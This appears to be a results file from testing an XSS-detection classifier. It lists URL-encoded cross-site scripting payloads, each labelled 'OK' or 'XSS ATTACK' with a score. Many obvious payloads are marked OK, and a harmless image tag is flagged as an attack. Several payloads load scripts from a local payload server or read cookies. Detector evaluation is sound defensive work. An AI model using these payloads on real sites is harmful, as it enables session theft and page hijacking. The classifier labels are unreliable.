sentence,result,threshold
%27%3E%3C%21--%3Cvalue%3E%3C%21%5BCDATA%5B%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%3C%21%5BCDATA%5Bcript%3Aalert%281%29%3B%22%3E,OK,0.128130406
%3Cbody%20language%3Dvbsonload%3Dalert-1,OK,0.0911399722
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%3C/ScrIpt%3E%3CSCRIPT%3Ea%3D/X/%5Cnalert%281%29%3B%3C/SCRIPT%3E,OK,0.0261321068
%22%3E%3Cscript%3Ealert%28x.y.x.y.x.y%5B0%5D%29%3Balert%28x.x.x.x.x.x.x.x.x.y.x.y.x.y%5B0%5D%29%3B%3C/script%3E,OK,0.20889765
%27%3E%3Cform%3E%3Cbutton%20formaction%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EX,OK,0.00770446658
%27%3E%3Cimg/%3Fonerror%3Dalert%281%29%20src%3Da%3E,OK,0.0367620587
%3Cscript%20src%3D%22data%3Atext/plain%2Calert%281%29%22%3E%3C/script%3E,XSS ATTACK,0.935295463
%27%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E,OK,0.0219560862
%22%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Bjavascript%26colon%3Balert%281%29%22/%3E,OK,0.00422102213
%3Cdiv%20style%3D%22background%3Aurl%28http%3A//foo.f/f%20oo/%3Bcolor%3Ared/%2A/foo.jpg%29%3B%22%3EX%3C/div%3E,OK,0.0007815063
%3CIMG%20SRC%3Djavascript%3Aalert%28%27X%27%29%3E,XSS ATTACK,0.456436455
%3Ccomment%3E%3Cimg%20src%3D%22%3C/comment%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29//%22%3E,XSS ATTACK,0.55104965
%22%3E%3Cbody%20onBeforeUnload%20body%20onBeforeUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onBeforeUnload%3E,OK,0.00364437699
%22%3E%3CSCRIPT%20FOR%3Ddocument%20EVENT%3Donreadystatechange%3Ejavascript%3Aalert%281%29%3C/SCRIPT%3E,XSS ATTACK,0.974746227
%26lt%3BMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Aalert%281%29%3B%22%26gt%3B,OK,0.010125339
%27%3E%3Cscript%20onReadyStateChange%20script%20onReadyStateChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/script%20onReadyStateChange%3E,OK,0.0107785761
%3Ciframe%20src%20iframe%20src%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/iframe%20src%3E,OK,0.303245544
%27%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Ddata%3Aimage/svg%2Bxml%3B%20base64%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E,OK,0.130727291
%3C%3Fxml%3Anamespace%20prefix%3D%22t%22%20ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E,OK,0.00477838516
%27%3E%3Cdiv%20style%3D%22list-style%3Aurl%28http%3A//foo.f%29%5C20url%28javascript%3Aalert%281%29%29%3B%22%3EX%3C/div%3E,OK,0.00144770741
%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3B%3E,OK,0.0362618566
%3C/ScrIpt%3E%3CSCRIPT%3Ea%3D/X/,OK,0.0828157067
%22%3B%20eval%28%27%5Cu0061%27%2B%27%5Cx6c%27%2B%27e%27%2B%27r%27%2B%27t%27%29%282%29%3B%20%22,OK,0.00840890408
%3Clink%20rel%3Dstylesheet%20href%3Ddata%3A%2C%2A%257bx%3Aexpression%28javascript%3Aalert%281%29%29%257d,OK,0.00104284286
%22%3E%3Cscript%20src%3D%22data%3A%5CxE0%5CxA4%5Cx98%2Cjavascript%3Aalert%281%29%22%3E%3C/script%3E,XSS ATTACK,0.811208725
%3C/ScrIpt%3E%3Cscript%3Ecrypto.generateCRMFRequest%28%27CN%3D0%27%2C0%2C0%2Cnull%2C%27alert%281%29%27%2C384%2Cnull%2C%27rsa-dual-use%27%29%3C/script%3E,OK,0.0108003914
%3Caudio%20src%3D1%20onerror%3Dalert%281%29%3E,OK,0.0839329362
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
%27%3E%3Cform%20action%3D%22%26Tab%3Bjavas%26Tab%3Bcript%26Tab%3B%3Aalert%28%27X%20%3A%29%27%29%22%20autocomplete%3D%22on%22%3E%20First%20name%3A%3Cinput%20type%3D%22text%22%20name%3D%22fname%22%3E%3Cbr%3E%3Cinput%20type%3D%22submit%22%3E%3C/form%3E,OK,0.00049751997
%22%3E%3Ciframe%20src%20iframe%20src%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/iframe%20src%3E,OK,0.387456775
%27%3E%3CTABLE%20BACKGROUND%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,XSS ATTACK,0.769911349
%3C/SCRIPT%3E%3F%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29,XSS ATTACK,0.975687742
%27%3E%3Cimg/onerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax%20/%3E,OK,0.167860717
%3Cdiv%20style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EX,OK,0.00278067589
%27%3E%3Ca%20href%3D%22%5Cx09javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0289816856
%3Ca%20href%3D%27,OK,0.0163326263
%3CIMG%20ONERROR%3D%3FVBS%3AEXECSCRIPT%20LCASE%28%3FALERT%281%29%3F%29%3F%20SRC%3DA%3E,XSS ATTACK,0.88969934
%3C/ScrIpt%3E%3CSCRIPT%3Ex%3D/X/%20%20alert%28x.source%29%3C/SCRIPT%3E,OK,0.033634305
%22%60%27%3E%3Cscript%3E%5CxEF%5CxBF%5CxBEjavascript%3Aalert%281%29%3C/script%3E,OK,0.277423441
%3Cdiv%20style%3D%27x%3Aanytext/%2A%2A/xxxx/%2A%2A/n%28alert%281%29%29%20%28%22%5C%22%29%29%29%29%29%29expressio%5C%22%29%27%3Eaa%3C/div%3E,OK,0.0370922387
%27%3E%3CSTYLE%3E%40import%27%25%28css%29s%27%3B%3C/STYLE%3E,XSS ATTACK,0.994101822
%3C/ScrIpt%3E%3Cscript%3E%7E%27%5Cu0061%27%20%3B%20%20%5Cu0074%5Cu0068%5Cu0072%5Cu006F%5Cu0077%20%7E%20%5Cu0074%5Cu0068%5Cu0069%5Cu0073.%20%20%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%7E%27%5Cu0061%27%29%3C/script%20U%2B,OK,0.000215649605
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%27%3E%3Cimg%20src%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmp.bmp%22%20onerror%3Dalert%281%29%3E,OK,0.00335940719
%3Cscript%3Eif%28%22x%5C%22.length%3D%3D2%29%20%7B%20alert%281%29%3B%7D%3C/script%3E,XSS ATTACK,0.808035553
%22%3E%3Cbody/onload%3D%26lt%3B%21--%26gt%3B%26%2310alert%281%29%3E,XSS ATTACK,0.845446467
%22%3E%3Cform%3E%3Ciframe%20%26%2309%3B%26%2310%3B%26%2311%3B%20src%3D%22javascript%26%2358%3Balert%281%29%22%26%2311%3B%26%2310%3B%26%2309%3B%3B%3E,OK,0.00880527496
%22%3E%3Cbody%20onscroll%3Dprompt%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,OK,0.0103903413
%22%3E%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2C%25%28base64%29s%22%3E,XSS ATTACK,0.817063332
%27%3E%3Cimg%20onerror%3D%3Falert%281%29%3Fsrc%3Da%3E,OK,0.0238580406
%22%3E%3Cscript%5Cx0Atype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,OK,0.0718658864
%3Ca%20href%3D%22%5Cx04javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00413781404
%22%3E%3Csvg%20onload%3Dprompt%281%29%3B%3E,OK,0.0157470107
%22%3E%3Cbody%20onload%3D%22%24%7D%29%7D%7D%7D%7D%29%3Balert%281%29%3B%28%7B0%3A%7B0%3A%7B0%3Afunction%28%29%7B0%28%7B%22%3E,OK,0.0231952965
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%3F%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.946466684
%22%3E%3Cbody%20onpageshow%3Dalert%281%29%3B%3E,XSS ATTACK,0.623204648
%27%3E%3Cscript%3E%20function%20a%28%29%20%7B%7D%20%3C/script%3E%20%3Cimg%20src%3D1%20onerror%3D%22a%28%29%3Balert%281%29%22%3E,OK,0.285096794
%22%3E%3Cscript%3Eeval%28String.fromCharCode%2875%2C67%2C70%29%29%3B%3C/script%3E,OK,0.296068668
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C%21--%20%27%3C/script%3E,OK,0.0537936687
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%3C//%20style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E,OK,0.0205059946
%22%3E%3Cimg%20src%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/image.png%22%20onerror%3Dalert%281%29%3E,OK,0.00256606936
%3C%3Fxml-stylesheet%20type%3D%22text/xsl%22%20href%3D%22%23%22%20%3F%3E%20%3Cstylesheet%20xmlns%3D%22http%3A//www.w3.org/TR/WD-xsl%22%3E%20%3Ctemplate%20match%3D%22/%22%3E%20%3Ceval%3Enew%20ActiveXObject%28%26apos%3Bhtmlfile%26apos%3B%29.parentWindow.alert%281%29%3C/eval%3E%20%3Cif%20expr%3D%22new%20ActiveXObject%28%27htmlfile%27%29.parentWindow.alert%282%29%22%3E%3C/if%3E%20%3C/template%3E%20%3C/stylesheet%3E,OK,0.00308537483
%22%3E%3Cdiv%20id%3D%22div1%22%3E%3Cinput%20value%3D%22%60%60onmouseover%3Dalert%281%29%22%3E%3C/div%3E%20%3Cdiv%20id%3D%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML%20%3D%20document.getElementById%28%22div1%22%29.innerHTML%3B%3C/script%3E,OK,0.000360101461
%22%3E%3Cimg/onerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax%20/%3E,OK,0.163758367
%3C/script%3E%3Cimg%20%27//%22%250Aonerror%3Dalert%281%29//%20src%3D1%3E,OK,0.28823173
%27%3E%3Cimg%20onerror%3Da%26%23x0006c%3Bert%281%29%20src%3Da%3E,OK,0.00492021441
%22%3E%3C%21--%5Bif%20WindowsEdition%5D%3E%3Cscript%3Econfirm%281%29%3B%3C/script%3E%3C%21%5Bendif%5D--%3E,XSS ATTACK,0.998748064
%27%3E%3Cbody%20onFocus%20body%20onFocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onFocus%3E,XSS ATTACK,0.695865512
%27%3E%3CBR%20SIZE%3D%22%26%7Balert%281%29%7D%22%3E,XSS ATTACK,0.898542285
a%3D%22get%22%3Bb%3D%22URL%28%5C%22%22%3Bc%3D%22javascript%3A%22%3Bd%3D%22alert%281%29%3B%5C%22%29%22%3Beval%28a%2Bb%2Bc%2Bd%29%3B,OK,0.0030362606
%22%3E%3Cdiv%20style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A//foo.f/oo%7D%3Bcolor%3Ared/%2A/foo.jpg%29%3B%22%3EX,OK,0.0035713017
%27%3E%3C%21--%5Bif%5D%3E%3Cscript%3Ealert%281%29%3C/script%20--%3E,XSS ATTACK,0.998549283
%27%3E%3Cdiv%20style%3D%22x%3A%20/%2A%2A/ression%28alert%281%29%29%28%27%5C%27%29exp%5C%27%29%22%3E,OK,0.00288140774
%27%3E%3Cform%3E%3Cbutton%20formaction%3D%22javascript%3Aalert%281%29%22%3EX%3C/button%3E,OK,0.00867760181
%3Ca%20href%3D%22about%3A%3Cscript%3Ealert%281%29%3B%3C/script%3E,OK,0.037754178
%22%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%22--%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27IPT%20SRC%3Dhttp%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%3E%3C/SCRIPT%3E%27%22--%3E,XSS ATTACK,0.923615336
%3C/ScrIpt%3E%3Cscript%3EReferenceError.prototype.__defineGetter__%28%27name%27%2C%20function%28%29%7Bjavascript%3Aalert%281%29%7D%29%2Cx%3C/script%3E,OK,0.0294552445
%22%3E%3CSCRIPT%20SRC%3Dhttp%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%3E%3C/SCRIPT%3E,XSS ATTACK,0.995716095
%27%3E%3C%3Fxml-stylesheet%20type%3D%22text/css%22%3F%3E%3Croot%20style%3D%22x%3Aexpression%28write%281%29%29%22/%3E,OK,0.0567426383
%22%3E%3Cscript%3Ealert%28%5B%21%21%5B%5D%5D%20%5B%5D%29%3C/script%3E,OK,0.0468274951
%22%3E%3Cscript%3Ealert%281%29%3B%3C/script%3E,XSS ATTACK,0.437528253
%27%3E%3Cscript/%26Tab%3B%20src%3D%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%27%20/%26Tab%3B%3E%3C/script%3E,OK,0.00436297059
%22%3E%3Ctextarea%3EX%3C/textarea%3E%3C%21--%3C/textarea%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E--%3E,XSS ATTACK,0.679145157
%22%3E%3Chtml%20onmouseover%20html%20onmouseover%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onmouseover%3E,OK,0.00221136212
%27%3E%3Cimg%20%5Cx00src%3Dx%20onerror%3D%22alert%281%29%22%3E,OK,0.252488077
%27%3E%3Cimage%20name%3DactiveElement%3E%3Csvg%20onload%3Dalert%281%29%3E,XSS ATTACK,0.906911731
%22%3E%3Cimg%20src%3Dx%20onerror%3D%5Cx12%22javascript%3Aalert%281%29%22%3E,OK,0.00240108371
%22%3E%3C/script%3E%3Cscript%3Eprompt%281%29%3C/script%3E,XSS ATTACK,0.88296622
%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Ddata%3Atext/html%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E,OK,0.0117892325
%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%27%29%3B%3E,OK,0.00356966257
%27%3E%3Ca%20href%3D%22%5Cx08javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0293602943
%22%7Calert%281%29%7C%22,OK,0.0651783943
%22%3E%3Cbody%20onload%3D%22alert%281%29%3B%22%3E,XSS ATTACK,0.699687302
%27%3E%3Cdiv%20style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C/div%3E,OK,0.0970771611
%3Cimg%20src%3Dx%20onerror%3Ddocument.body.innerHTML%3Dlocation.hash%3E%23%22%3E%3Cimg/src%3D%27x%27onerror%3Dprompt%281%29%3E,OK,0.00438883901
this%5B%27document%27%5D%5B%27%5Cx63%5Cx6f%5Cx6f%5Cx6b%5Cx69%5Cx65%27%5D,OK,0.377321184
%27%3E%3Cbody%20onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,OK,7.09776577e-05
%3Cscript%5Cx0A%3Ejavascript%3Aalert%281%29%3C/script%3E,XSS ATTACK,0.768982291
%22%3E%3CDIV%20STYLE%3D%22width%3A%20expression%28alert%28%27X%27%29%29%3B%22%3E,XSS ATTACK,0.938687921
%22%3E%3Cimg/%3Fonerror%3Dalert%281%29%20src%3Da%3E,OK,0.0364093184
%3C/ScrIpt%3E%3CSCRIPT%3Ea%3D/X/,OK,0.0828157067
%3Csvg/onload%3Dlocation%3D/java/.source%2B/script/.source%2Blocation.h%20ash%5B1%5D%2B/al/.source%2B/ert/.source%2Blocation.hash%5B2%5D%2B/docu/.source%2B/ment.domain/.source%2Blocation.has%20h%5B3%5D//%23%3A%28%29,OK,0.00316980481
%22%3E%3Cdiv%20onmouseover%3D%22alert%281%29%3B%22%3E,OK,0.0186883211
%3CIMG%20SRC%3Djavascript%3Aalert%28%26quot%3BX%26quot%3B%29%3E,OK,0.212776303
%3F%3Balert%28%3FX%3F%29%3B%3F,OK,0.147930175
%22%3E%3CIFRAME%20SRC%3D%23%20onmouseover%3D%22alert%28document.cookie%29%22%3E%3C/IFRAME%3E,XSS ATTACK,0.994783223
%3Ca%20href%3D%22javas%5Cx0Dcript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00478181243
%27%3E%3Cimg%20src%3D%22%22%20onerror%3Dalert%281%29%3E,OK,0.00833728909
%3Cimg%20src%3D%27xx%3Ax%5C%20onerror%3D%22alert%281%29%22%3E%27%3E,OK,0.0328966975
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%3Cimg/src%3D%22mars.png%22alt%3D%22mars%22%3E,XSS ATTACK,0.900733232
%27%3E%3Cdiv%20style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A//foo.f/oo%7D%3Bcolor%3Ared/%2A/foo.jpg%29%3B%22%3EX,OK,0.00358170271
%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%22--%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27IPT%20SRC%3Dhttp%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%3E%3C/SCRIPT%3E%27%22--%3E,OK,0.00435468554
%27%3E%3Cstyle%3E%2A%7Bx%3A%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%28alert%281%29%29%7D%3C/style%3E,OK,0.00999811292
%3Cimg%20src%5Cx12%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.00748065114
%27%3E%3Cscript%3Eprompt%28-%5B%5D%29%3C/script%3E,OK,0.271531463
%3Ca%20href%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B1%26rpar%3B%22%3EX%3C/a%3E,OK,0.00359159708
%22%3E%3Csvg%3E%3C%3FGMO%3D%60%3Cftw%3D%60skrowtillehehtwoh%3B%20onload%3Dconfirm%28location%29%3B,OK,0.000727474689
%22%3E%3Cdiv%20style%3D%22behaviour%3A%20url%28%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%27%29%3B%22%3E,OK,0.0115906
%22%3E%3Cisindex%20type%3Dimage%20src%3D1%20onerror%3Dalert%281%29%3E,XSS ATTACK,0.993067145
%27%3E%3C/a%20onmousemove%3D%22alert%281%29%22%3E,XSS ATTACK,0.9189291
%3Cbody%20onUnload%20body%20onUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onUnload%3E,OK,0.0331570804
%27%3E%3Cimg%20src%3Dx%5Cx11onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.00488758087
%22%3E%3CScRipT%205-0%2A3%2B9/3%3D%3Eprompt%281%29%3C/ScRipT%20giveanswerhere%3D%3F,OK,0.00470477343
%3Ca%20href%3D%22javas%5Cx07cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00582000613
%27%3E%3Cstyle%3E%3Cimg%20src%3D%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%22%3E,OK,0.0164000988
%3Cstyle%20onLoad%20style%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/style%20onLoad%3E,OK,0.0060980618
%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Ddata%3Atext/html%20base64%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E,OK,0.0130586922
Redirect%20302%20/axaaX.jpg%20http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html,XSS ATTACK,0.9988873
%22%3E%3Cbody%20onbeforeunload%20body%20onbeforeunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onbeforeunload%3E,OK,0.00371095538
%27%3E%3CINPUT%20TYPE%3D%22IMAGE%22%20SRC%3D%22javascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.971212864
%3CSTYLE%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Aalert%28%27X%27%29%22%29%3B%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX%3C/br%3E,OK,0.063144654
%22%3E%3Cimg%5Cx10src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0186398327
%22%3E%3C/TITLE%3E%3CSCRIPT%3Ealert%281%29%3B%3C/SCRIPT%3E,XSS ATTACK,0.928102493
%22%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Ddata%3Atext/html%20base64%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E,OK,0.0266755223
%22%3E%3Cimg%20src%3Dxx%3Axx%20onerror%3Dwindow%5B%5B%27alert%27%5D%5D%281%29%3E,OK,0.0042348206
%3C/ScrIpt%3E%3Cscript%3Eif%28%22x%5C%5CxE1%5Cx96%5Cx89%22.length%3D%3D2%29%20%7B%20javascript%3Aalert%281%29%3B%7D%3C/script%3E,OK,0.0724585056
%27%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E,OK,0.0219560862
%3C/script%3E%3Cimg/%2A%2500/src%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22/%2500%2A/onerror%3D%27eval%28src%29%27%3E,OK,0.343231976
%3CSCRIPT/X%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.999389052
%3Cmeta%20content%3D%22%26NewLine%3B%201%20%26NewLine%3B%3BJAVASCRIPT%26colon%3B%20alert%281%29%22%20http-equiv%3D%22refresh%22/%3E,OK,0.00628319383
%27%3E%3CSCRIPT%20%22a%3D%27%3E%27%22%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.979211748
%22%3E%3Cimg%20src%3D%60%2500%60%26NewLine%3B%20onerror%3Dalert%281%29%26NewLine%3B,OK,0.000804543495
%3Cimg%250D%250Asrc%253Da%250D%250Aonerror%253Dalert%25281%2529%3E,XSS ATTACK,0.600043416
%22%3E%3CBODY%20ONLOAD%3Dalert%28%27X%27%29%3E,XSS ATTACK,0.996611893
%27%3E%3Cimg%250D%250Asrc%253Da%250D%250Aonerror%253Dalert%25281%2529%3E,OK,0.0291664302
%3Ca%20href%3D%22%5CxE2%5Cx80%5CxA9javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0514627099
%27%3E%3CSCRIPT%3Ea%3D/X/,XSS ATTACK,0.8973822
%22%3E%3Cimg%20src%3D%22x%3Aalert%22%20onerror%3D%22eval%28src%252b%27%281%29%27%29%22%3E,OK,0.000930786133
%3Ca%20href%3D%22javas%5Cx05cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00602740049
%3Cbgsound%20onpropertychange%3Dalert%281%29%3E,XSS ATTACK,0.972159505
%22%3E%3C/a%20onmousemove%3Dalert%281%29%3E,XSS ATTACK,0.880313635
%3CIMG%20SRC%3D%22livescript%3A%5Bcode%5D%22%3E,XSS ATTACK,0.857061148
%22%3E%3Ciframe/%2500/%20src%3DjavaSCRIPT%26colon%3Balert%281%29,XSS ATTACK,0.921574533
%22%3E%3Cscript%5Cx0A%3Ejavascript%3Aalert%281%29%3C/script%3E,XSS ATTACK,0.606105566
%3C/ScrIpt%3E%3Cscript%3E/%2A%20%2A%5Cx2A/javascript%3Aalert%281%29//%20%2A/%3C/script%3E,OK,0.00288930535
%27%3E%3CDIV%20STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E,OK,0.0436494946
%22%3E%3C/svg%3E%27%27%3Csvg%3E%3Cscript%20%27AQuickBrownFoxJumpsOverTheLazyDog%27%3Ealert%26%23x28%3B1%26%23x29%3B,OK,0.00738060474
%27%3E%3Cstyle%3E%40import%20%22data%3A%2C%2A%257bx%3Aexpression%28write%281%29%29%257D%22%3B%3C/style%3E,OK,0.0590195954
%27%3E%3Ca%20href%3D%22%5Cx06javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0302065313
%22%3E%3Cimg%20src%3Dx%3Axx%20onerror%3D%22try%20%7BexecScript%28%27a%3D1%27%2C%27vbs%27%29%3Balert%281%29%3B%7Dcatch%28e%29%7Balert%281%29%3B%7D%22%3E,OK,0.0121978521
%3Ctextarea%20onfocus%3Djavascript%3Aalert%281%29%20autofocus%3E,XSS ATTACK,0.844428778
%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.239136726
%27%3E%3Cimg/onerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax%20/%3E,OK,0.154259384
%22%3E%3Cembed%20code%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess%3Dalways%3E,XSS ATTACK,0.924073756
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
